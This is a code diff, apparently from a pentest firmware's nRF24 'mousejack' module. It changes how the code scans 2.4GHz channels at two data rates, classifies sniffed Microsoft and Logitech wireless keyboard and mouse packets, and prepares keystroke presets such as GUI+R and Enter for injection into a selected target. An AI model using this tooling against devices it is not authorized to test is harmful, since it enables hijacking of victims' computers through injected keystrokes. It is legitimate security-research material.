@@ -41,27 +41,28 @@ static const char* mjTypeName(uint8_t t) {
 }
 
 static uint8_t mjDetectType(uint8_t *payload, uint8_t len) {
-    if (len < 10) return MJ_TYPE_UNKNOWN;
+    if (len < 12) return MJ_TYPE_UNKNOWN;
 
-    if ((payload[0] == 0x08 || payload[0] == 0x0C) &&
-        payload[1] == 0x90)
-        return MJ_TYPE_MS_KEYBOARD;
+    uint8_t *proto = payload + 5;
 
-    if ((payload[0] == 0x08 || payload[0] == 0x0C) &&
-        (payload[1] == 0x90 || payload[1] == 0x50))
+    if ((proto[0] == 0x08 || proto[0] == 0x0C) && proto[1] == 0x90) {
+        if (proto[2] == 0x02)
+            return MJ_TYPE_MS_KEYBOARD;
         return MJ_TYPE_MS_MOUSE;
+    }
 
-    if (payload[0] == 0x00 && payload[1] == 0x4F)
+    if (proto[0] == 0x00 && proto[1] == 0x4F)
         return MJ_TYPE_LOGI_UNIFYING;
-    if (payload[0] == 0x00 && payload[1] == 0xC2)
+    if (proto[0] == 0x00 && (proto[1] == 0xC1 || proto[1] == 0xC2))
         return MJ_TYPE_LOGI_UNIFYING;
-    if (payload[0] == 0x00 && payload[1] == 0xD3)
+    if (proto[0] == 0x00 && proto[1] == 0xD3)
         return MJ_TYPE_LOGI_LIGHTSPEED;
 
-    for (int i = 0; i < 5 && i < len; i++) {
-        if (payload[i] != 0x00 && payload[i] != 0xFF)
-            return MJ_TYPE_GENERIC_HID;
+    bool hasData = false;
+    for (int i = 5; i < 10 && i < len; i++) {
+        if (payload[i] != 0x00 && payload[i] != 0xFF) { hasData = true; break; }
     }
+    if (hasData) return MJ_TYPE_GENERIC_HID;
 
     return MJ_TYPE_UNKNOWN;
 }
@@ -127,7 +128,7 @@ struct MjKeystroke {
 };
 
 static const MjKeystroke mjPresets[] = {
-    {"Hello World",    0x0B, 0x00},
+    {"Key H",          0x0B, 0x00},
     {"GUI+R (Run)",    0x15, 0x08},
     {"Enter",          0x28, 0x00},
     {"GUI (WinKey)",   0x00, 0x08},
@@ -154,11 +155,13 @@ void nrf_mousejack() {
     NRFradio.disableCRC();
     NRFradio.setAddressWidth(5);
     NRFradio.setPALevel(RF24_PA_MAX);
-    NRFradio.setDataRate(RF24_2MBPS);
     NRFradio.setPayloadSize(MJ_PAYLOAD_SIZE);
 
     const uint8_t promAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};
     NRFradio.openReadingPipe(0, promAddr);
+
+    const uint8_t dataRates[] = {RF24_2MBPS, RF24_1MBPS};
+    const char* rateNames[] = {"2M", "1M"};
 
     tft.fillScreen(bruceConfig.bgColor);
     tft.setTextSize(FM);
@@ -170,33 +173,37 @@ void nrf_mousejack() {
     tft.println("Scanning 2.4GHz...");
     tft.drawRoundRect(2, 2, tftWidth - 4, tftHeight - 4, 5, bruceConfig.priColor);
 
-    for (int pass = 0; pass < 12; pass++) {
-        for (int ch = 0; ch < MJ_CHANNELS; ch++) {
-            NRFradio.setChannel(ch);
-            NRFradio.startListening();
-            delayMicroseconds(MJ_SCAN_DWELL_US);
-            NRFradio.stopListening();
+    for (int rIdx = 0; rIdx < 2; rIdx++) {
+        NRFradio.setDataRate((rf24_datarate_e)dataRates[rIdx]);
+        for (int pass = 0; pass < 6; pass++) {
+            for (int ch = 0; ch < MJ_CHANNELS; ch++) {
+                NRFradio.setChannel(ch);
+                NRFradio.startListening();
+                delayMicroseconds(MJ_SCAN_DWELL_US);
+                NRFradio.stopListening();
 
-            if (NRFradio.available()) {
-                uint8_t payload[MJ_PAYLOAD_SIZE];
-                NRFradio.read(payload, MJ_PAYLOAD_SIZE);
+                if (NRFradio.available()) {
+                    uint8_t payload[MJ_PAYLOAD_SIZE];
+                    NRFradio.read(payload, MJ_PAYLOAD_SIZE);
 
-                uint8_t type = mjDetectType(payload, MJ_PAYLOAD_SIZE);
-                if (type != MJ_TYPE_UNKNOWN) {
-                    uint8_t addr[5];
-                    for (int i = 0; i < 5; i++) addr[i] = payload[i];
-                    mjAddDevice(addr, 5, ch, type);
+                    uint8_t type = mjDetectType(payload, MJ_PAYLOAD_SIZE);
+                    if (type != MJ_TYPE_UNKNOWN) {
+                        uint8_t addr[5];
+                        for (int i = 0; i < 5; i++) addr[i] = payload[i];
+                        mjAddDevice(addr, 5, ch, type);
+                    }
                 }
             }
-        }
 
-        tft.fillRect(5, 40, tftWidth - 10, FP * LH, bruceConfig.bgColor);
-        tft.setCursor(5, 40);
-        tft.printf("Pass %d/12 | Found: %d", pass + 1, mjDevCount);
+            int totalPass = rIdx * 6 + pass + 1;
+            tft.fillRect(5, 40, tftWidth - 10, FP * LH, bruceConfig.bgColor);
+            tft.setCursor(5, 40);
+            tft.printf("Pass %d/12 %s | Found: %d", totalPass, rateNames[rIdx], mjDevCount);
 
-        if (check(EscPress)) {
-            NRFradio.stopListening();
-            return;
+            if (check(EscPress)) {
+                NRFradio.stopListening();
+                return;
+            }
         }
     }
 
@@ -244,6 +251,7 @@ void nrf_mousejack() {
     NRFradio.stopListening();
     NRFradio.setChannel(target.channel);
     NRFradio.setAutoAck(false);
+    NRFradio.setCRCLength(RF24_CRC_16);
     NRFradio.openWritingPipe(target.addr);
     NRFradio.setPayloadSize(MJ_PAYLOAD_SIZE);
 
